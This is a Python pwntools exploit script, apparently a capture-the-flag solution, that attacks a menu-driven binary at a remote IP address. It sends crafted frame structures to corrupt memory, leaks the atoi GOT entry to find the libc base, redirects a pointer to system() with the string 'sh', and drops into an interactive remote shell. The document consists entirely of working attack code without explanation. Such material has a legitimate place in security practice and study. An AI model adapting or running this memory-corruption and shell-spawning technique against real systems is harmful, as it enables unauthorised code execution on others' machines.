from pwn import *

#context.log_level = 'debug'

p = remote('124.222.151.145','10002')
elf = ELF('./sample')
libc = ELF('./libc.so.6')


def config(frame):
    p.recvuntil('ch> ')
    p.sendline(str(1))
    p.recvuntil('FRAME> ')
    p.send(frame)

def PrintInfo():
    p.recvuntil('ch> ')
    p.sendline(str(2))

def rain():
    p.recvuntil('ch> ')
    p.sendline(str(3))


frame = p32(0x20)+p32(0x20)+p8(2)+p8(1)+p32(100)+p32(40000)+'B'*0x40
config(frame)
frame = p32(0x20)+p32(0x20)+p8(2)+p8(1)+p32(0)+p32(40000)
config(frame)
frame = p32(0x20)+p32(0x20)+p8(2)+p8(1)+p32(0)+p32(40000)
config(frame)
rain()
frame = p32(0x20)+p32(0x20)+p8(2)+p8(1)+p32(1)+p32(40000)
frame+= p32(0)+p32(0x40)+p8(2)+p8(1)+'P'*0x6+p64(0)+p64(0)+p32(1)+p32(40000)+p64(0x400E17)+p64(elf.got['atoi'])+p64(0xdeadbeef)
config(frame)
PrintInfo()
p.recvuntil('Table:            ')
libc_base = u64(p.recv(6)+b'\x00\x00')-libc.sym['atoi']
system = libc_base + libc.sym['system']
p.info('libc_base: '+hex(libc_base))
p.info('system: '+hex(system))
frame = p32(0x20)+p32(0x20)+p8(2)+p8(1)+p32(1)+p32(40000)
config(frame)
frame = p32(0x20)+p32(0x20)+p8(2)+p8(1)+p32(1)+p32(40000)
frame+= p32(0x6873)+p32(0x20)+p8(2)+p8(1)+'P'*0x6+p64(0)+p64(0)+p32(1)+p32(40000)+p64(system)+p64(0xdeadbeef)+p64(0xdeadbeef)
config(frame)
PrintInfo()


p.interactive()